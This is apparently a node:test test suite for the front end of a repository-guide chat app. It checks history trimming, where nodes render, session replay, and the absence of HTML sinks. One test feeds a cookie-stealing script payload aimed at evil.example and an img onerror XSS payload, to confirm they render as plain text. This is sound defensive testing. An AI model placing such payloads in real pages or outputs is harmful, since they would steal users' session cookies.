/* ============================================================================
   tests/ui/test_app.mjs -- node:test, no browser, no npm install.

     node --test tests/ui/test_app.mjs

   ui/app.js is a classic script, not a module: index.html loads it with a
   plain <script src> and it exports nothing. So instead of importing it, each
   test evaluates the real file in a fresh vm context whose globals are a
   minimal DOM shim. Scripts run in the same context share its top-level
   lexical scope, which is how the second runInContext call below reaches
   `state`, `buildBody` and friends without app.js carrying any test seam.

   The shim implements only what app.js actually touches: getElementById,
   createElement, createTextNode, appendChild, replaceChildren, textContent,
   className, classList, setAttribute, hidden, value, disabled, focus and
   addEventListener. Timers are fake and never fire on their own, so the step
   predictor cannot leave a handle open and the tests stay deterministic.

   What is asserted here (task 8.2, Property 17 and Property 19):
     1. the request body's `messages` is a contiguous suffix of the client
        transcript in order, at most ten turns, and encodes to at most
        8,192 bytes
     2. every assistant node lands inside #transcript, and every message node
        leads with p.msg__who
     3. no HTML sink -- innerHTML and relatives -- appears anywhere in the
        code of ui/app.js
     4. untrusted text carrying markup becomes text, never nodes
   ========================================================================= */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import vm from "node:vm";

const APP_PATH = new URL("../../ui/app.js", import.meta.url);
const SOURCE = readFileSync(APP_PATH, "utf8");

const MAX_TURNS = 10; // Requirement 3 AC7
const MAX_BODY_BYTES = 8192; // Requirement 8 AC1

const IDS = [
  "composer",
  "input",
  "input-label",
  "send",
  "transcript",
  "status",
  "steps",
  "ingested",
  "ingested-list",
  "source-link",
  "tagline",
  "input-hint",
];

// ---------------------------------------------------------------------------
// The DOM shim
// ---------------------------------------------------------------------------

class TextNode {
  constructor(text) {
    this.nodeType = 3;
    this.parentNode = null;
    this.childNodes = [];
    this.textContent = String(text);
  }
}

class El {
  constructor(tagName) {
    this.nodeType = 1;
    this.tagName = tagName;
    this.parentNode = null;
    this.childNodes = [];
    this.attributes = new Map();
    this.className = "";
    this.hidden = false;
    this.disabled = false;
    this.value = "";
    this.focusCount = 0;
    this.listeners = new Map();

    this.classList = {
      add: (name) => {
        const names = new Set(this.classes());
        names.add(name);
        this.className = [...names].join(" ");
      },
      remove: (name) => {
        this.className = this.classes()
          .filter((each) => each !== name)
          .join(" ");
      },
      contains: (name) => this.classes().includes(name),
    };
  }

  classes() {
    return this.className.split(/\s+/).filter((name) => name !== "");
  }

  get textContent() {
    return this.childNodes.map((node) => node.textContent).join("");
  }

  set textContent(value) {
    this.childNodes = [];
    this.appendChild(new TextNode(value));
  }

  appendChild(node) {
    node.parentNode = this;
    this.childNodes.push(node);
    return node;
  }

  replaceChildren(...nodes) {
    for (const node of this.childNodes) node.parentNode = null;
    this.childNodes = [];
    for (const node of nodes) this.appendChild(node);
  }

  setAttribute(name, value) {
    this.attributes.set(name, String(value));
  }

  getAttribute(name) {
    return this.attributes.has(name) ? this.attributes.get(name) : null;
  }

  removeAttribute(name) {
    this.attributes.delete(name);
  }

  addEventListener(type, handler) {
    if (!this.listeners.has(type)) this.listeners.set(type, []);
    this.listeners.get(type).push(handler);
  }

  dispatch(type, event) {
    for (const handler of this.listeners.get(type) || []) handler(event);
  }

  focus() {
    this.focusCount += 1;
  }
}

function createDom() {
  const registry = new Map(IDS.map((id) => [id, new El(id === "composer" ? "form" : "div")]));

  // index.html ships these two with the hidden attribute set, so app.js has
  // something to reveal.
  registry.get("ingested").hidden = true;
  registry.get("source-link").hidden = true;

  const document = {
    getElementById: (id) => (registry.has(id) ? registry.get(id) : null),
    createElement: (tag) => new El(tag),
    createTextNode: (text) => new TextNode(text),
  };

  const store = new Map();
  const sessionStorage = {
    getItem: (key) => (store.has(key) ? store.get(key) : null),
    setItem: (key, value) => store.set(key, String(value)),
    removeItem: (key) => store.delete(key),
  };

  return { document, sessionStorage, byId: (id) => registry.get(id), registry };
}

/* Fake timers. The step predictor schedules one at a time and app.js clears it
   when the response lands, so nothing here ever needs to fire -- but keeping
   them inert means a leaked timer shows up as a pending entry rather than as a
   test that hangs for three and a half seconds. */
function createTimers() {
  const pending = new Map();
  let next = 1;
  return {
    pending,
    setTimeout: (fn, ms) => {
      const id = next++;
      pending.set(id, { fn, ms });
      return id;
    },
    clearTimeout: (id) => {
      pending.delete(id);
    },
  };
}

// ---------------------------------------------------------------------------
// Booting app.js
// ---------------------------------------------------------------------------

function boot(responder) {
  const dom = createDom();
  const timers = createTimers();
  const calls = [];
  let app = null;

  const fetchStub = async (url, init) => {
    // The stub body runs synchronously when fetch is called, so this is the
    // client's transcript exactly as it stood when the request went out.
    // Array.from, not .map: a vm-realm array has a vm-realm prototype, which
    // node:assert deep comparisons treat as a mismatch.
    const transcriptAtSend = app
      ? Array.from(app.state.messages, (turn) => ({
          role: turn.role,
          content: turn.content,
        }))
      : [];
    // This stub runs mid-flight, which is the only moment the in-flight
    // progress indicator can be observed (Requirement 5 AC7).
    const call = {
      url,
      body: init.body,
      transcriptAtSend,
      statusAtSend: dom.byId("status").textContent,
      statusBusyAtSend: dom.byId("status").classes().includes("status--busy"),
      busyAtSend: dom.byId("transcript").getAttribute("aria-busy"),
      sendDisabledAtSend: dom.byId("send").disabled,
      timersAtSend: timers.pending.size,
    };
    calls.push(call);
    const payload = responder(call, calls.length);
    return { status: 200, json: async () => payload };
  };

  const sandbox = {
    document: dom.document,
    sessionStorage: dom.sessionStorage,
    fetch: fetchStub,
    setTimeout: timers.setTimeout,
    clearTimeout: timers.clearTimeout,
    TextEncoder,
    console,
  };

  const context = vm.createContext(sandbox);
  vm.runInContext(SOURCE, context, { filename: "ui/app.js" });

  app = vm.runInContext(
    "({ state, STEPS, buildBody, splitBlocks, inlineSpans, phase, onSubmit })",
    context,
  );

  const read = (expression) => vm.runInContext(expression, context);
  return { dom, timers, calls, app, read };
}

async function settle(predicate, limit = 200) {
  for (let i = 0; i < limit; i += 1) {
    if (predicate()) return;
    await new Promise((resolve) => setImmediate(resolve));
  }
  throw new Error("the turn never settled");
}

async function submit(harness, text) {
  harness.dom.byId("input").value = text;
  harness.app.onSubmit(null);
  await settle(() => harness.read("inFlight") === false);
}

function okResponse(message, paths = ["README.md", "pyproject.toml", "src/app.py"]) {
  return {
    message,
    mode: "chat",
    repo: {
      slug: "pallets/flask",
      default_branch: "main",
      detected_language: "Python",
      ingested_paths: paths,
    },
    steps: [
      { name: "validating_url", status: "ok", ms: 1 },
      { name: "fetching_metadata", status: "ok", ms: 214 },
      { name: "asking_nova", status: "ok", ms: 2910 },
    ],
    correlation_id: "0f1c9b2e-5a71-4e2e-9a50-9c6d0b6e3a44",
  };
}

function errorResponse(message) {
  return {
    error: { code: "REPO_NOT_FOUND", message },
    steps: [
      { name: "validating_url", status: "ok", ms: 1 },
      { name: "fetching_metadata", status: "error", ms: 233 },
      { name: "listing_files", status: "skipped", ms: 0 },
    ],
    correlation_id: "4a2b0c1d-8e3f-4a5b-9c6d-7e8f90a1b2c3",
  };
}

// ---------------------------------------------------------------------------
// Walking the rendered tree
// ---------------------------------------------------------------------------

function descendants(node, found = []) {
  for (const child of node.childNodes) {
    found.push(child);
    descendants(child, found);
  }
  return found;
}

function allNodes(dom) {
  const found = [];
  for (const id of IDS) {
    const root = dom.byId(id);
    found.push(root);
    descendants(root, found);
  }
  return found;
}

function messageNodes(dom) {
  return allNodes(dom).filter(
    (node) => node.nodeType === 1 && node.classes().includes("msg"),
  );
}

// A seeded generator, so a failure is reproducible.
function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/* Plausible turn text: prose, a backtick span, an occasional fence, the odd
   quote and non-ASCII character so the encoded byte length is genuinely
   larger than the character count. Bounded well under the 8 KB cap, because
   the client trims whole turns -- it never shortens one. */
function makeText(random, length) {
  const words = [
    "routing",
    "blueprint",
    "`src/flask/app.py`",
    "handler",
    "the \"wsgi\" entry point",
    "décorateur",
    "tests",
    "config",
  ];
  let text = "";
  while (text.length < length) {
    text += `${words[Math.floor(random() * words.length)]} `;
    if (random() < 0.06) text += "\n\n";
    if (random() < 0.02) text += "\n```\napp = Flask(__name__)\n```\n";
  }
  return text.slice(0, length).trim();
}

// ---------------------------------------------------------------------------
// 1. The request body. Property 17, Requirements 7 AC7 and 7 AC8.
// ---------------------------------------------------------------------------

test("the sent history is a contiguous suffix, at most ten turns, inside 8 KB", async () => {
  const random = mulberry32(20261012);
  const harness = boot((call, n) =>
    okResponse(makeText(random, 600 + Math.floor(random() * 1200)), [
      "README.md",
      `src/module_${n}.py`,
    ]),
  );

  await submit(harness, "https://github.com/pallets/flask");

  for (let turn = 0; turn < 30; turn += 1) {
    await submit(harness, makeText(random, 40 + Math.floor(random() * 360)));
  }

  let sawTrim = false;

  for (const call of harness.calls) {
    const body = JSON.parse(call.body);
    const sent = body.messages;
    const held = call.transcriptAtSend;

    assert.equal(call.url, "/api/chat", "same-origin relative endpoint");
    assert.equal(body.repo_url, "https://github.com/pallets/flask");
    assert.ok(Array.isArray(sent));

    // Requirement 3 AC7.
    assert.ok(sent.length <= MAX_TURNS, `sent ${sent.length} turns`);

    // Requirement 8 AC1: the server's 413 is a backstop, not the normal path.
    assert.ok(
      new TextEncoder().encode(call.body).length <= MAX_BODY_BYTES,
      `body was ${new TextEncoder().encode(call.body).length} bytes`,
    );

    // A contiguous suffix of what the client holds, in the original order.
    assert.deepEqual(sent, held.slice(held.length - sent.length));

    if (sent.length < Math.min(MAX_TURNS, held.length)) sawTrim = true;
  }

  // The shrink loop has to have actually run, or the bound above proves nothing.
  assert.ok(sawTrim, "no request ever had to drop a turn");

  // Requirement 6 AC1 shape: dropping turns is said out loud, inline.
  const notices = messageNodes(harness.dom).filter((node) =>
    node.classes().includes("msg--notice"),
  );
  assert.ok(notices.length > 0, "history was trimmed without telling the user");
});

// ---------------------------------------------------------------------------
// 2. Where the nodes land. Property 19, Requirement 7 AC6, Requirement 6 AC1.
// ---------------------------------------------------------------------------

test("every assistant node lands inside #transcript", async () => {
  let failNext = false;
  const harness = boot(() =>
    failNext
      ? errorResponse("I could not find that repository. Check the spelling and try again.")
      : okResponse("Start in `README.md`, then `src/app.py`."),
  );

  const transcript = harness.dom.byId("transcript");

  await submit(harness, "https://github.com/pallets/flask");
  await submit(harness, "what runs the tests?");
  await submit(harness, "where does routing live?");

  failNext = true;
  await submit(harness, "and the private one?");

  // The orientation request carries no history: the server infers the mode
  // from an empty messages array (Requirement 5 AC1).
  assert.deepEqual(JSON.parse(harness.calls[0].body).messages, []);

  // Requirement 5 AC7: while the turn is in flight the status line names the
  // step, the transcript is marked busy, and the next step is already queued.
  for (const call of harness.calls) {
    assert.equal(call.statusAtSend, "Checking the URL");
    assert.equal(call.statusBusyAtSend, true);
    assert.equal(call.busyAtSend, "true");
    assert.equal(call.sendDisabledAtSend, true);
    assert.equal(call.timersAtSend, 1);
  }

  const messages = messageNodes(harness.dom);
  const assistants = messages.filter((node) => node.classes().includes("msg--assistant"));
  const errors = messages.filter((node) => node.classes().includes("msg--error"));

  assert.equal(assistants.length, 3);
  assert.equal(errors.length, 1);

  for (const node of messages) {
    assert.equal(node.tagName, "li");
    assert.equal(node.parentNode, transcript, "a message node escaped the live region");

    const first = node.childNodes[0];
    assert.equal(first.tagName, "p");
    assert.ok(first.classes().includes("msg__who"), "msg__who is not the first child");
    assert.ok(["You", "Guide", "Problem", "Note"].includes(first.textContent));
  }

  // The error response is rendered as a chat message carrying the server's
  // own copy, not swallowed or replaced with a client-side generic.
  assert.match(errors[0].textContent, /could not find that repository/);

  // A failed turn leaves no unanswered user turn in the history, so the next
  // request cannot carry two user turns in a row.
  const roles = Array.from(harness.app.state.messages, (turn) => turn.role);
  assert.deepEqual(roles, ["assistant", "user", "assistant", "user", "assistant"]);

  assert.equal(transcript.getAttribute("aria-busy"), "false");
  assert.equal(harness.dom.byId("status").textContent, "");
  assert.equal(harness.timers.pending.size, 0, "a step timer was left running");

  // The phase switch, and focus back on the one input.
  assert.equal(harness.dom.byId("input-label").textContent, "Ask about this repository");
  assert.equal(harness.dom.byId("send").textContent, "Send");
  assert.ok(harness.dom.byId("input").focusCount >= 4);

  // The authoritative checklist from the last response, with its durations.
  const steps = harness.dom.byId("steps").childNodes;
  assert.equal(steps.length, 3);
  assert.ok(steps[1].classes().includes("step--error"));
  assert.match(steps[1].childNodes[0].textContent, /Looking up the repository - failed/);
  assert.equal(steps[1].childNodes[1].textContent, "233 ms");

  // The step vocabulary is the server's. agent/steps.py StepName is the source.
  assert.deepEqual(
    Array.from(harness.app.STEPS, (step) => step.name),
    [
      "validating_url",
      "fetching_metadata",
      "listing_files",
      "selecting_files",
      "reading_files",
      "building_context",
      "asking_nova",
    ],
  );
});

// ---------------------------------------------------------------------------
// 3. No HTML sink in the source.
// ---------------------------------------------------------------------------

/* Strips comments and string literals so the scan below cannot be fooled by
   prose that merely names a sink -- the header comment in app.js explains why
   there is no innerHTML, which would otherwise match. */
function codeOnly(source) {
  let out = "";
  let i = 0;
  while (i < source.length) {
    const two = source.slice(i, i + 2);
    if (two === "//") {
      while (i < source.length && source[i] !== "\n") i += 1;
      continue;
    }
    if (two === "/*") {
      i += 2;
      while (i < source.length && source.slice(i, i + 2) !== "*/") i += 1;
      i += 2;
      continue;
    }
    const char = source[i];
    if (char === '"' || char === "'" || char === "`") {
      i += 1;
      while (i < source.length && source[i] !== char) {
        if (source[i] === "\\") i += 1;
        i += 1;
      }
      i += 1;
      out += '""';
      continue;
    }
    out += char;
    i += 1;
  }
  return out;
}

test("ui/app.js contains no HTML sink", () => {
  const code = codeOnly(SOURCE);

  for (const sink of [
    /innerHTML/,
    /outerHTML/,
    /insertAdjacentHTML/,
    /document\s*\.\s*write/,
    /\beval\s*\(/,
    /new\s+Function\s*\(/,
    /createContextualFragment/,
  ]) {
    assert.doesNotMatch(code, sink, `ui/app.js uses ${sink}`);
  }

  // And the stripper is doing its job: the explanation is still in the file.
  assert.match(SOURCE, /no innerHTML assignment/);
});

// ---------------------------------------------------------------------------
// 4. Untrusted text stays text.
// ---------------------------------------------------------------------------

test("markup in model output is rendered as text, not nodes", async () => {
  const hostile = [
    'Open <script>fetch("https://evil.example/"+document.cookie)</script> first.',
    "",
    "Then `app.py` and <img src=x onerror=alert(1)>.",
    "",
    "```html",
    "<b>not bold</b>",
    "```",
  ].join("\n");

  const harness = boot(() => okResponse(hostile));
  await submit(harness, "https://github.com/pallets/flask");

  const node = messageNodes(harness.dom).find((each) =>
    each.classes().includes("msg--assistant"),
  );

  const tags = descendants(node)
    .filter((child) => child.nodeType === 1)
    .map((child) => child.tagName);

  // p.msg__who, two paragraphs, one <pre>, one <code> for the `app.py` span.
  assert.deepEqual(tags.sort(), ["code", "p", "p", "p", "pre"]);
  assert.ok(!tags.includes("script"));
  assert.ok(!tags.includes("img"));
  assert.ok(!tags.includes("b"));

  // Every angle bracket survived as a character rather than becoming a node.
  assert.match(node.textContent, /<script>/);
  assert.match(node.textContent, /<img src=x onerror=alert\(1\)>/);
  assert.match(node.textContent, /<b>not bold<\/b>/);

  // The fence became a <pre>, the backtick span a <code>, and the backticks
  // themselves are gone from the text.
  const pre = descendants(node).find((child) => child.tagName === "pre");
  assert.equal(pre.textContent, "<b>not bold</b>");
  const code = descendants(node).find((child) => child.tagName === "code");
  assert.equal(code.textContent, "app.py");

  // Requirement 4 AC5: the disclosure opens once there is something to show.
  assert.equal(harness.dom.byId("ingested").hidden, false);
  assert.equal(harness.dom.byId("ingested-list").childNodes.length, 3);

  // Requirement 9 AC2: no href, so no dead tab stop.
  assert.equal(harness.dom.byId("source-link").hidden, true);
});

// ---------------------------------------------------------------------------
// 5. The sessionStorage mirror.
// ---------------------------------------------------------------------------

test("a reload replays the transcript from sessionStorage", async () => {
  const first = boot(() => okResponse("This is `pallets/flask`, a Python web framework."));
  await submit(first, "https://github.com/pallets/flask");
  await submit(first, "what runs the tests?");

  const saved = first.dom.sessionStorage.getItem("welcome-guide.v1");
  assert.ok(saved, "state was never mirrored");

  // A second boot sharing the same store is the reload.
  const second = boot(() => okResponse("unused"));
  second.dom.sessionStorage.setItem("welcome-guide.v1", saved);
  second.read("restore(); applyPhase();");

  const turns = (harness) =>
    Array.from(harness.app.state.messages, (turn) => ({
      role: turn.role,
      content: turn.content,
    }));

  assert.deepEqual(turns(second), turns(first));
  assert.equal(second.app.state.repoUrl, "https://github.com/pallets/flask");
  assert.equal(second.app.phase(), "chat");
  assert.equal(second.dom.byId("send").textContent, "Send");

  // The URL echo plus the two assistant turns and the one user turn.
  const replayed = messageNodes(second.dom).map((node) =>
    node.classes().find((name) => name.startsWith("msg--")),
  );
  assert.deepEqual(replayed, ["msg--user", "msg--assistant", "msg--user", "msg--assistant"]);
});
